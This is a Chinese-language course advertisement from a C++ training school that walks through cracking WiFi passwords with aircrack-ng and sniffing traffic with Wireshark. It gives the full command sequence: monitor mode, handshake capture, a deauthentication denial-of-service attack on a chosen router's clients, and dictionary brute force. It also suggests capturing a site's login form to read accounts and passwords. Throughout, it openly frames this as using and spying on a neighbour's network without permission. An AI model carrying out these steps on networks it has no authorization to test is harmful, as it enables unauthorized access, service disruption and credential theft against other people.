[TOC]
# WIFI密码破解与网络数据抓包——传智播客C++学院
# 【课程介绍】
屌丝逆袭之蹭网利器，在女朋友面前炫耀一下自己的“黑客功底”，在Linux的世界里，其实这都不是什么难事；瘫痪路由器，发起网络攻击，抓包数据分析，加入"网络圣战"，进入Linux世界，轻松让你成为“高逼格”的IT达人。
# 【课程知识点】
1. Wifi密码破解原理剖析
2. 网络数据抓包与分析
3. 路由器攻击，瘫痪网络
4. 随心所欲，开发定制密码字典
5. 枚举字典，暴力破解
6. 轻松使用”隔壁老王“的wifi
# 【课程详情】
##  Wifi密码破解原理剖析
## Aircrack-ng
### 下载

	http://www.aircrack-ng.org/
	http://www.aircrack-ng.org/downloads.html
	wget http://download.aircrack-ng.org/aircrack-ng-1.2-rc2.tar.gz

### 安装

	sudo apt-get install build-essential libssl-dev pkg-config libnl-3-dev libnl-genl-3-dev
	tar xvf aircrack-ng-1.2-rc2.tar.gz
	cd aircrack-ng-1.2-rc2
	make
	sudo make install
## WIFI 密码破解
1. 查看本机电脑无线网卡

	iwconfig  或者 ifconfig

2. 激活网卡到monitor模式，得到监控模式下的设备名为wlan0mon

	sudo airmon-ng  start  wlan0

3. 探测无线网络，选取破解路由器对象

	 sudo airodump-ng  wlang0mon

4. 设定监控频道，抓取被选定路由器的数据包，始终运行

	sudo airodump-ng  --ivs  -w  linuxcpp  -c  6  wlang0mon

	捕获的包存入linuxcp-0x.ivs 文件。x为序号

5. 新开终端，发起Deauth攻击，迫使客户端重新链接路由器

	sudo aireplay-ng  -0  1  -a 路由器MAC  -h  合法链接客户端MAC   wlan0mon

	De-Authentication DoS
	去验证洪水攻击，国际上称之为De-authentication Flood Attack，全称即去身份验证洪水攻击或去验证阻断洪水攻击，通常被简称为Deauth攻击，是无线网络拒绝服务攻击的一种形式，它旨在通过欺骗从AP到客户端单播地址的去身份验证帧来将客户端转为未关联的/未认证的状态。

如果Deauth攻击成功，airodump-ng捕获handshake ，此时可以ctrl+c终止airodump-ng抓包。

6. aircrack-ng 穷举字典，暴力破解

	sudo aircrack-ng  -w  dic  linuxcpp-01.ivs

	破解成功与否取决与字典是否涵盖全面，破解速度取决于硬件计算性能和字典优化

## 字典开发

##  网络数据抓包与分析

Wireshark是一个非常好用的抓包工具，当我们遇到一些和网络相关的问题时，可以通过这个工具进行分析，不过要说明的是，这只是一个工具，用法是非常灵活的。

wireshark下载地址

	https://www.wireshark.org/download.html

### 选取网卡

wireshark左上角，查找list那个钮。

### 设置抓包过滤器(CaptureFilters)

	语法： Protocol $ Direction $ Host(s) $ Value $ Logical Operations $ Other expression
	例子：  ip  src host  192.168.1.100 
	            tcp  dst  port  8080

#### Protocol（协议）:

可能的值: ether, fddi, ip, arp, rarp, decnet, lat, sca, moprc, mopdl, tcp and udp.

如果没有特别指明是什么协议，则默认使用所有支持的协议。

#### Direction（方向）:

可能的值: src, dst, src and dst, src or dst

如果没有特别指明来源或目的地，则默认使用 “src or dst” 作为关键字。
例如，”host 10.2.2.2″与”src or dst host 10.2.2.2″是一样的。

#### Host(s):

可能的值： net, port, host, portrange.

如果没有指定此值，则默认使用”host”关键字。
例如，”src 10.1.1.1″与”src host 10.1.1.1″相同。

#### Logical Operations（逻辑运算）:

可能的值：not, and, or.

否(“not”)具有最高的优先级。或(“or”)和与(“and”)具有相同的优先级，运算时从左至右进行。
例如:

	“not tcp port 3128 and tcp port 23″与”(not tcp port 3128) and tcp port 23″相同。
	“not tcp port 3128 and tcp port 23″与”not (tcp port 3128 and tcp port 23)”不同。

如果过滤器的语法是正确的，表达式的背景呈绿色。如果呈红色，说明表达式有误。

### 设置显示过滤器(DisplayFilters)

	语法： Protocol.String1.String2  $  Comparison operator  $  Value $ Logical Operations $ Other expression
	例子： ip.src==192.168.1.100  (显示来源为192.192.168.1.100的包)
	           tcp.port==80

### 网络封包分析

	捕获登陆某网站的表单，分析其账号和密码。

### 隔壁老王，蹭了你的网，看了你的信，就差......

如何防御呢？如何更灵活的进攻呢？欢迎大家走进传智播客c++学院，掌握高性能的c/c++语言，精通高B格的Linux系统编程，想要什么工具？自己写起。。。

## 广州c++分校开班 —— 2016年3月20号

## 北京总部c++开班 —— 2015年12月5号

	
